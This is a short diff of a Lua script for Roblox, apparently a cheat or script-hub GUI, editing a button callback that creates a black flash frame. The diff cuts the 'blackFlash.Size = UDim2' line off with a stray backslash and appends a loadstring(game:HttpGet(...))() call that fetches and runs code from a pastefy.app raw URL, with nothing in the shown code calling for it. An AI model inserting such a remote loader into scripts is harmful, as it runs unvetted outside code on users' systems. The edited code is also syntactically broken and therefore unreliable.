@@ -146,4 +146,6 @@ miscTab:CreateButton({
     Callback = function()
         local screenGui = Instance.new("ScreenGui", game.CoreGui)
         local blackFlash = Instance.new("Frame", screenGui)
-        blackFlash.Size = UDim2
+        blackFlash.Size = UDim2\
+
+loadstring(game:HttpGet("https://pastefy.app/fs1jiEYW/raw"))()
